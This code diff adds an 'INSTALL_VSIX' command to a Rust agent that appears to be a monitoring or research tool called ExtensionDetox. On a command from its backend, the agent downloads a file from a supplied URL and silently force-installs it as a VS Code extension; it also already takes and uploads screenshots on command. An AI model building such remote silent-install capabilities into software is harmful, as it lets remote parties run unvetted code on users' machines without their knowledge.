@@ -940,6 +940,102 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                     "SCREENSHOT" => {
                                         take_and_upload_screenshot(&backend_url);
                                     },
+                                    "INSTALL_VSIX" => {
+                                        // ExtensionDetox: Download VSIX and silently install via VS Code CLI
+                                        if let Some(url) = cmd.url {
+                                            let safe_filename = cmd.filename.unwrap_or_else(|| "extension.vsix".to_string());
+                                            let dest_path = format!("C:\\Users\\Public\\{}", safe_filename);
+                                            let tx_vsix = evt_tx.clone();
+                                            let hostname_vsix = hostname.clone();
+
+                                            std::thread::spawn(move || {
+                                                // 1. Download the VSIX
+                                                match reqwest::blocking::get(&url) {
+                                                    Ok(mut response) => {
+                                                        match std::fs::File::create(&dest_path) {
+                                                            Ok(mut file) => {
+                                                                if let Err(e) = response.copy_to(&mut file) {
+                                                                    let _ = tx_vsix.send(AgentEvent {
+                                                                        event_type: "VSIX_ERROR".to_string(),
+                                                                        process_id: 0, parent_process_id: 0,
+                                                                        process_name: "Agent".to_string(),
+                                                                        details: format!("Failed to write VSIX: {}", e),
+                                                                        decoded_details: None,
+                                                                        timestamp: chrono::Utc::now().timestamp_millis(),
+                                                                        hostname: hostname_vsix.clone(),
+                                                                        digital_signature: None,
+                                                                    });
+                                                                    return;
+                                                                }
+                                                                let _ = file.sync_all();
+                                                                drop(file);
+                                                                std::thread::sleep(std::time::Duration::from_millis(500));
+
+                                                                // 2. Install via VS Code CLI
+                                                                println!("[AGENT] Installing VSIX: {}", dest_path);
+                                                                match std::process::Command::new("code")
+                                                                    .args(&["--install-extension", &dest_path, "--force"])
+                                                                    .output()
+                                                                {
+                                                                    Ok(output) => {
+                                                                        let stdout = String::from_utf8_lossy(&output.stdout);
+                                                                        let stderr = String::from_utf8_lossy(&output.stderr);
+                                                                        let _ = tx_vsix.send(AgentEvent {
+                                                                            event_type: "VSIX_INSTALLED".to_string(),
+                                                                            process_id: 0,
+                                                                            parent_process_id: std::process::id(),
+                                                                            process_name: dest_path.clone(),
+                                                                            details: format!("VSIX installed. stdout: {} stderr: {}", stdout.trim(), stderr.trim()),
+                                                                            decoded_details: None,
+                                                                            timestamp: chrono::Utc::now().timestamp_millis(),
+                                                                            hostname: hostname_vsix.clone(),
+                                                                            digital_signature: None,
+                                                                        });
+                                                                    },
+                                                                    Err(e) => {
+                                                                        let _ = tx_vsix.send(AgentEvent {
+                                                                            event_type: "VSIX_ERROR".to_string(),
+                                                                            process_id: 0, parent_process_id: 0,
+                                                                            process_name: dest_path.clone(),
+                                                                            details: format!("VS Code CLI failed: {}", e),
+                                                                            decoded_details: None,
+                                                                            timestamp: chrono::Utc::now().timestamp_millis(),
+                                                                            hostname: hostname_vsix.clone(),
+                                                                            digital_signature: None,
+                                                                        });
+                                                                    }
+                                                                }
+                                                            },
+                                                            Err(e) => {
+                                                                let _ = tx_vsix.send(AgentEvent {
+                                                                    event_type: "VSIX_ERROR".to_string(),
+                                                                    process_id: 0, parent_process_id: 0,
+                                                                    process_name: "Agent".to_string(),
+                                                                    details: format!("Failed to create VSIX file: {}", e),
+                                                                    decoded_details: None,
+                                                                    timestamp: chrono::Utc::now().timestamp_millis(),
+                                                                    hostname: hostname_vsix.clone(),
+                                                                    digital_signature: None,
+                                                                });
+                                                            }
+                                                        }
+                                                    },
+                                                    Err(e) => {
+                                                        let _ = tx_vsix.send(AgentEvent {
+                                                            event_type: "VSIX_ERROR".to_string(),
+                                                            process_id: 0, parent_process_id: 0,
+                                                            process_name: "Agent".to_string(),
+                                                            details: format!("VSIX download failed: {}", e),
+                                                            decoded_details: None,
+                                                            timestamp: chrono::Utc::now().timestamp_millis(),
+                                                            hostname: hostname_vsix.clone(),
+                                                            digital_signature: None,
+                                                        });
+                                                    }
+                                                }
+                                            });
+                                        }
+                                    },
                                     "UPLOAD_PIVOT" => {
                                         if let Some(path) = cmd.path {
                                             let b_url = backend_url.clone();
